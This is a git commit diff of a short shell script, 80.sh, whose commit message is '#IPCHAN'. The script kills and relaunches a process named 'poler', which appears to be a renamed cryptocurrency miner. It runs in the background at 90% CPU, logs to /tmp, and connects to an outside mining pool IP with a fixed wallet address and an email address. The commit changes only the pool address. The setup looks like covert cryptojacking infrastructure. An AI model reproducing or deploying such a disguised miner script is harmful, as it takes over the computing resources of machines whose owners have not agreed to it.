09f6047c9c1a4e1d4b03bdea5e02e995c36499f5
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-05-21 06:11:43 +0300

    #IPCHAN

--- 80.sh
+++ 80.sh
@@ -1,3 +1,3 @@
 pkill poler
 sleep 7
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 90 --cpu-priority 4 -o 168.235.102.74:6426 -u 4297XE2wiBecRU6hp7j6mwE6t7TmCF7eEMpyDvWLQS7n2a5S7ahcZMVPbitLS3tzySXJwgGcGyP4U8bpAHjECBf6BvscfPi --pass=a6:nikolajzarkov770@gmail.com -k
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 90 --cpu-priority 4 -o 109.234.34.49:5971 -u 4297XE2wiBecRU6hp7j6mwE6t7TmCF7eEMpyDvWLQS7n2a5S7ahcZMVPbitLS3tzySXJwgGcGyP4U8bpAHjECBf6BvscfPi --pass=a6:nikolajzarkov770@gmail.com -k
